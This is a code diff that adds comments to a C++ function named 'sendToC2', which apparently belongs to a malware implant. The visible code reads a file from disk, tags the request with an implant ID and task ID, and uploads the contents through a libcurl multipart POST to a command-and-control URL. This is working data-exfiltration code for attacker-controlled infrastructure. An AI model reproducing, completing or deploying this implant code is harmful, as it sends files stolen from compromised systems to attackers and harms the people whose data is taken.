@@ -19,6 +19,7 @@ void sendToC2(string path, string url, string filename, string taskid, string im
 	s = "implant_id:" + implant_id;
 	headers = curl_slist_append(headers, s.c_str());
 	std::string contents;
+    //read file and store in contents
 	std::ifstream in(path, std::ios::in | std::ios::binary);
 	if (in)
 	{
@@ -33,6 +34,7 @@ void sendToC2(string path, string url, string filename, string taskid, string im
 	struct curl_httppost* formpost = NULL;
 	struct curl_httppost* lastptr = NULL;
 	curl_global_init(CURL_GLOBAL_ALL);
+    //add content type and file to the form
 	curl_formadd(&formpost,
 		&lastptr,
 		CURLFORM_COPYNAME, "content-type:",
@@ -46,13 +48,16 @@ void sendToC2(string path, string url, string filename, string taskid, string im
 		CURLFORM_END);
 	curl = curl_easy_init();
 	if (curl){
+        //set options for headers, url, and form
 		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
 		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
 		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
+        //perform the request
 		res = curl_easy_perform(curl);
 		if (res != CURLE_OK)
 			fprintf(stderr, "curl_easy_perform() failed: %s\n",
 				curl_easy_strerror(res));
+        //cleanup
 		curl_easy_cleanup(curl);
 		curl_formfree(formpost);
 	}
